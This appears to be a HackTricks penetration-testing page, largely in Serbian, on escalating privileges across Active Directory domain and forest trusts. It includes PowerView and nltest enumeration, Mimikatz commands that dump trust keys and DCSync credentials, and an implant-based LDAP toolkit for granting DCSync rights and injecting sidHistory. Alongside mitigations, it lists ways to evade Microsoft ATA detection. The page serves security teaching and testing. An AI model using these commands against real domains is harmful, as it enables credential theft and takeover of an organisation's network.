Ranije smo diskutovali kako eskalirati privilegije ako imate **dovoljne permisije da čitate LAPS password-e**. Međutim, ove lozinke se takođe mogu koristiti za **održavanje persistence**.\
Pogledaj:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft smatra **Forest** bezbednosnom granicom. To implicira da **kompromitovanje jednog domena može potencijalno dovesti do kompromitovanja celog Forest-a**.

### Basic Information

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) je sigurnosni mehanizam koji omogućava korisniku iz jednog **domena** da pristupi resursima u drugom **domenu**. U suštini kreira vezu između autentikacionih sistema ta dva domena, omogućavajući tokove verifikacije autentikacije. Kada domeni postave trust, oni razmenjuju i čuvaju specifične **ključeve** unutar svojih **Domain Controller-a (DCs)**, koji su ključni za integritet trust-a.

U tipičnom scenariju, ako korisnik želi da pristupi servisu u **povirenom domenu**, prvo mora da zahteva poseban tiket poznat kao **inter-realm TGT** od svog domenskog DC-a. Taj TGT je enkriptovan zajedničkim **ključem** koji su oba domena dogovorila. Korisnik zatim predstavlja taj TGT **DC-u poverenog domena** da dobije service ticket (**TGS**). Nakon uspešne verifikacije inter-realm TGT-a od strane DC-a poverenog domena, on izdaje TGS, dodeljujući korisniku pristup servisu.

**Koraci**:

1. Klijentski računar u **Domain 1** započinje proces koristeći svoj **NTLM hash** da zatraži **Ticket Granting Ticket (TGT)** od svog **Domain Controller-a (DC1)**.
2. DC1 izdaje novi TGT ako je klijent uspešno autentifikovan.
3. Klijent zatim zahteva **inter-realm TGT** od DC1, koji je potreban za pristup resursima u **Domain 2**.
4. Inter-realm TGT je enkriptovan sa **trust key** koji dele DC1 i DC2 kao deo dvosmernog domain trust-a.
5. Klijent nosi inter-realm TGT na **Domain 2-ov Domain Controller (DC2)**.
6. DC2 verifikuje inter-realm TGT koristeći zajednički trust key i, ako je validan, izdaje **Ticket Granting Service (TGS)** za server u Domain 2 kome klijent želi da pristupi.
7. Na kraju, klijent prezentuje ovaj TGS serveru, koji je enkriptovan sa hash-om serverovog naloga, da dobije pristup servisu u Domain 2.

### Different trusts

Važno je primetiti da **trust može biti jednosmeran ili dvosmeran**. U opciji sa 2 smera, oba domena će se međusobno verovati, ali u **jednosmernoj** trust relaciji jedan od domena će biti **trusted** a drugi **trusting** domen. U tom poslednjem slučaju, **moći ćete pristupiti resursima unutar trusting domena iz trusted domena**.

Ako Domain A trust-uje Domain B, A je trusting domen a B je trusted domen. Štaviše, u **Domain A**, ovo bi bio **Outbound trust**; a u **Domain B**, ovo bi bio **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: Ovo je uobičajena postavka unutar istog foresta, gde child domen automatski ima dvosmerni tranzitivni trust sa svojim parent domenom. U suštini, to znači da autentikacioni zahtevi mogu slobodno teći između parent-a i child-a.
- **Cross-link Trusts**: Poznati i kao "shortcut trusts", uspostavljaju se između child domena da ubrzaju referral procese. U složenim forest-ovima, autentikacioni referrals obično moraju putovati do forest root-a i zatim nadole do ciljnog domena. Kreiranjem cross-linkova, put je skraćen, što je posebno korisno u geografski rasprostranjenim okruženjima.
- **External Trusts**: Postavljaju se između različitih, nepovezanih domena i po prirodi su non-transitive. Prema [Microsoft-ovoj dokumentaciji](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts su korisni za pristup resursima u domenu izvan trenutnog foresta koji nije povezan forest trust-om. Bezbednost se pojačava kroz SID filtering sa external trust-ovima.
- **Tree-root Trusts**: Ovi trust-ovi se automatski uspostavljaju između forest root domena i novododanog tree root-a. Iako se ne sreću često, tree-root trust-ovi su važni za dodavanje novih domain tree-ova u forest, omogućavajući im da zadrže jedinstveno ime domena i osiguravaju dvosmernu tranzitivnost. Više informacija je dostupno u [Microsoft-ovom vodiču](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Ovaj tip trust-a je dvosmerni tranzitivni trust između dva forest root domena, takođe primenjujući SID filtering radi poboljšanja sigurnosnih mera.
- **MIT Trusts**: Ovi trust-ovi se uspostavljaju sa non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domenima. MIT trusts su specijalizovaniji i namenjeni okruženjima koja zahtevaju integraciju sa Kerberos sistemima van Windows ekosistema.

#### Other differences in **trusting relationships**

- Trust relacija može biti i **transitivna** (A trust-uje B, B trust-uje C, onda A trust-uje C) ili **non-transitivna**.
- Trust relacija može biti postavljena kao **bidirectional trust** (oba se međusobno trust-uju) ili kao **one-way trust** (samo jedan trust-uje drugog).

### Attack Path

1. **Enumeriši** trust odnose
2. Proveri da li neki **security principal** (user/group/computer) ima **pristup** resursima **drugog domena**, možda kroz ACE unose ili članstvom u grupama iz drugog domena. Traži **relacije preko domena** (trust je verovatno napravljen zbog ovoga).
1. kerberoast u ovom slučaju može biti još jedna opcija.
3. **Kompromituj** **nalozi** koji mogu **pivot-ovati** kroz domene.

Napadači mogu dobiti pristup resursima u drugom domenu kroz tri glavna mehanizma:

- **Local Group Membership**: Principali mogu biti dodati u lokalne grupe na mašinama, kao što je grupa “Administrators” na serveru, čime dobijaju značajnu kontrolu nad tom mašinom.
- **Foreign Domain Group Membership**: Principali takođe mogu biti članovi grupa unutar stranog domena. Međutim, efikasnost ove metode zavisi od prirode trust-a i opsega grupe.
- **Access Control Lists (ACLs)**: Principali mogu biti specificirani u **ACL-u**, posebno kao entiteti u **ACE-ovima** unutar **DACL-a**, dajući im pristup specifičnim resursima. Za one koji žele dublje da uđu u mehaniku ACL-a, DACL-a i ACE-ova, whitepaper pod nazivom “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” je neprocenjiv resurs.

### Find external users/groups with permissions

Možete proveriti **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** da biste pronašli foreign security principals u domenu. To će biti korisnici/grupe iz **eksternog domena/foresta**.

Možete ovo proveriti u **Bloodhound** ili koristeći powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Drugi načini za enumeraciju domain trusts:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Postoje **2 trusted keys**, jedna za _Child --> Parent_ i druga za _Parent_ --> _Child_.\
> Možete videti koju ključ koristi trenutni domen pomoću:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalate as Enterprise admin to the child/parent domain abusing the trust with SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Razumevanje kako se Configuration Naming Context (NC) može iskoristiti je ključno. Configuration NC služi kao centralno skladište konfiguracionih podataka kroz forest u Active Directory (AD) okruženjima. Ovi podaci se repliciraju na svaki Domain Controller (DC) unutar foresta, pri čemu writable DC-ovi održavaju writable kopiju Configuration NC. Da biste ovo iskoristili, potrebno je imati **SYSTEM privilegije na DC-u**, po mogućstvu na child DC-u.

**Link GPO to root DC site**

Sites kontejner Configuration NC sadrži informacije o site-ovima svih računara priključenih na domen unutar AD foresta. Radeći sa SYSTEM privilegijama na bilo kojem DC-u, napadači mogu linkovati GPO-ove na root DC site-ove. Ova akcija potencijalno kompromituje root domen manipulacijom politikama koje se primenjuju na ove site-ove.

Za detaljnije informacije, može se istražiti rad na [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Jedan vektor napada uključuje ciljane privilegovane gMSA unutar domena. KDS Root key, koji je neophodan za izračunavanje lozinki gMSA, skladišti se unutar Configuration NC. Sa SYSTEM privilegijama na bilo kojem DC-u moguće je pristupiti KDS Root key-u i izračunati lozinke za bilo koji gMSA kroz forest.

Detaljna analiza i korak-po-korak uputstva mogu se pronaći u:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Komplementarni delegirani MSA napad (BadSuccessor – zloupotreba migration atributa):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Dodatna spoljašnja istraživanja: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Ova metoda zahteva strpljenje — čekanje na kreiranje novih privilegovanih AD objekata. Sa SYSTEM privilegijama, napadač može izmeniti AD Schema kako bi dodelio bilo kojem korisniku potpunu kontrolu nad svim klasama. To bi moglo dovesti do neautorizovanog pristupa i kontrole nad novokreiranim AD objektima.

Dalje čitanje dostupno je u [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

ADCS ESC5 ranjivost cilja kontrolu nad PKI objektima kako bi kreirala certificate template koji omogućava autentifikaciju kao bilo koji korisnik unutar foresta. Pošto PKI objekti žive u Configuration NC, kompromitovanje writable child DC-a omogućava izvođenje ESC5 napada.

Više detalja može se pročitati u [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). U scenarijima bez ADCS-a, napadač ima mogućnost da postavi potrebne komponente, kao što je diskutovano u [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
U ovom scenariju **vaš domen je pouzdan** od strane spoljnog domena, koji vam daje **neodređene dozvole** nad njim. Treba da otkrijete **koji nalozi vašeg domena imaju koji pristup spoljnjem domenu** i zatim pokušate da to iskoristite:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Eksterni Forest Domain - Jednosmerno (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
U ovom scenariju **vaš domen** **veruje** nekim **privilegijama** principalu iz **drugog domena**.

Međutim, kada **domen bude poveren** od strane verujućeg domena, povereni domen **kreira korisnika** sa **predvidivim imenom** koji kao lozinku koristi odgovarajuću lozinku poverenja. Što znači da je moguće **koristiti nalog iz verujućeg domena da se uđe u povereni domen** da bi se izvršila enumeracija i pokušala dalja eskalacija privilegija:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Još jedan način kompromitacije poverenog domena je pronalaženje [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) kreiranog u **suprotnom pravcu** domenskog poveravanja (što nije često).

Još jedan način kompromitacije poverenog domena je čekati na mašini do koje se **korisnik iz poverenog domena može prijaviti** putem **RDP**. Napadač potom može ubaciti kod u proces RDP sesije i odatle **pristupiti izvornom domenu žrtve**.\
Pored toga, ako je **žrtva montirala svoj hard disk**, iz procesa **RDP sesije** napadač može smestiti **backdoors** u **startup folder hard diska**. Ova tehnika se zove **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Ublažavanje zloupotrebe poverenja domena

### **SID Filtering:**

- Rizik napada koji iskorišćavaju SID history atribut preko forest trustova ublažava SID Filtering, koji je po defaultu aktiviran na svim inter-forest trustovima. Ovo počiva na pretpostavci da su intra-forest trustovi sigurni, smatrajući forest, a ne domen, kao bezbednosnu granicu u skladu sa Microsoftovim stanovištem.
- Međutim, postoji problem: SID Filtering može poremetiti aplikacije i pristup korisnika, zbog čega se povremeno isključuje.

### **Selective Authentication:**

- Za inter-forest trustove, korišćenje Selective Authentication osigurava da korisnici iz dve foreste nisu automatski autentifikovani. Umesto toga, potrebna su eksplicitna dozvola da bi korisnici pristupili domenima i serverima unutar verujućeg domena ili foresta.
- Važno je napomenuti da ove mere ne štite od iskorišćavanja writable Configuration Naming Context (NC) niti od napada na trust account.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP zasnovana zloupotreba AD-a iz on-host implantata

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implementira bloodyAD-style LDAP primitive kao x64 Beacon Object Files koje se izvršavaju u potpunosti unutar on-host implantata (npr. Adaptix C2). Operateri kompajliraju paket sa `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, učitaju `ldap.axs`, i zatim pozovu `ldap <subcommand>` iz beacon-a. Sav saobraćaj ide kroz trenutni logon security context preko LDAP (389) sa signing/sealing ili LDAPS (636) sa automatskim poveravanjem sertifikata, tako da nisu potrebni socks proxy-ji ili artefakti na disku.

### LDAP enumeracija sa strane implantata

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` razrešavaju kratka imena/OU putanje u pune DN-ove i ispisuju odgovarajuće objekte.
- `get-object`, `get-attribute`, and `get-domaininfo` izvlače proizvoljne atribute (uključujući security descriptors) kao i forest/domain metadata iz `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` otkrivaju roasting kandidate, delegation podešavanja, i postojeće [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) deskriptore direktno iz LDAP-a.
- `get-acl` and `get-writable --detailed` parsiraju DACL da navedu trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes) i naslednost, dajući neposredne mete za eskalaciju privilegija putem ACL-a.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) omogućavaju operatoru da postavi nove principale ili machine accounts gde god postoje OU prava. `add-groupmember`, `set-password`, `add-attribute`, i `set-attribute` direktno preuzimaju ciljeve jednom kada se pronađu write-property prava.
- Komande fokusirane na ACL kao što su `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, i `add-dcsync` prevode WriteDACL/WriteOwner na bilo koji AD objekat u resetovanje lozinki, kontrolu članstva u grupama ili DCSync privilegije replikacije bez ostavljanja PowerShell/ADSI artefakata. `remove-*` ekvivalenti čiste ubačene ACE-e.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` momentalno čine kompromitovanog korisnika Kerberoastable; `add-asreproastable` (UAC toggle) označava ga za AS-REP roasting bez diranja lozinke.
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) prepisuju `msDS-AllowedToDelegateTo`, UAC flags, ili `msDS-AllowedToActOnBehalfOfOtherIdentity` iz beacona, omogućavajući constrained/unconstrained/RBCD puteve napada i eliminišući potrebu za remote PowerShell ili RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` injektuje privileged SIDs u SID history kontrolisanog principala (see [SID-History Injection](sid-history-injection.md)), obezbeđujući prikriveno nasledjivanje pristupa potpuno preko LDAP/LDAPS.
- `move-object` menja DN/OU računara ili korisnika, dopuštajući napadaču da premesti resurse u OUs gde već postoje delegirana prava pre nego što zloupotrebi `set-password`, `add-groupmember`, ili `add-spn`.
- Strogo ciljani remove komandi (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, itd.) omogućavaju brzo povlačenje nakon što operator sakupi kredencijale ili perzistenciju, minimizirajući telemetriju.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Neke opšte odbrane

[**Saznajte više o tome kako zaštititi kredencijale ovde.**](../stealing-credentials/credentials-protections.md)

### **Odbrambene mere za zaštitu kredencijala**

- **Domain Admins Restrictions**: Preporučuje se da Domain Admins budu dozvoljeni za prijavu samo na Domain Controllers, izbegavajući njihovu upotrebu na drugim hostovima.
- **Service Account Privileges**: Servisi ne bi trebalo da se pokreću sa Domain Admin (DA) privilegijama radi održavanja bezbednosti.
- **Temporal Privilege Limitation**: Za zadatke koji zahtevaju DA privilegije, njihovo trajanje bi trebalo ograničiti. Ovo se može postići komandom: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`

### **Implementacija tehnika obmane**

- Implementacija obmane uključuje postavljanje zamki, kao što su decoy users ili computers, sa podešavanjima kao što su lozinke koje ne ističu ili su označeni kao Trusted for Delegation. Detaljan pristup uključuje kreiranje korisnika sa specifičnim pravima ili dodavanje u grupe visokih privilegija.
- Praktičan primer uključuje upotrebu alata kao što su: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Više o deploy-ovanju deception tehnika možete pronaći na [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Prepoznavanje obmane**

- **Za User Objects**: Sumnjivi indikatori uključuju netipičan ObjectSID, retke logone, datume kreiranja i nizak broj neuspelih pokušaja lozinke.
- **Opšti indikatori**: Poređenje atributa potencijalnih decoy objekata sa onima stvarnih može otkriti nedoslednosti. Alati kao što je [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) mogu pomoći u identifikaciji takvih obmana.

### **Zaobilaženje sistema za detekciju**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Izbegavanje session enumeration na Domain Controllers kako bi se sprečila ATA detekcija.
- **Ticket Impersonation**: Korišćenje **aes** ključeva za kreiranje tiketa pomaže u izbegavanju detekcije tako što se ne degraduje na NTLM.
- **DCSync Attacks**: Izvođenje sa non-Domain Controller mašine je preporučljivo da bi se izbegla ATA detekcija, pošto će direktno izvršenje sa Domain Controller-a aktivirati alarme.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
